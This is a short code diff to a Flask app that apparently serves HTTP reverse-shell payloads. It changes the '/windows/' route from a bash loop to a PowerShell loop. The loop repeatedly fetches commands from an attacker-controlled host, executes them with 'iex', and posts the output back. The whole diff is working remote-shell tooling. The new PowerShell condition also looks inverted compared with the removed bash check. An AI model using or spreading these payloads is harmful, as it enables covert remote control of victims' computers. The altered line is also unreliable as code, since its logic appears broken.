@@ -18,7 +18,7 @@ def get_home():
 
 @app.route('/windows/', methods=['GET'])
 def get_windows():
-    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+    return 'While(1){{$c=(Invoke-WebRequest {hostname}/http_reverse_shell/?ready=true).Content;If($c -eq ''){{Invoke-WebRequest {hostname}/http_reverse_shell/ -Method Post -Body @{{\'stdout\'=iex $c}}}};sleep {delay}}}'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
 
 
 @app.route('/bash/', methods=['GET'])
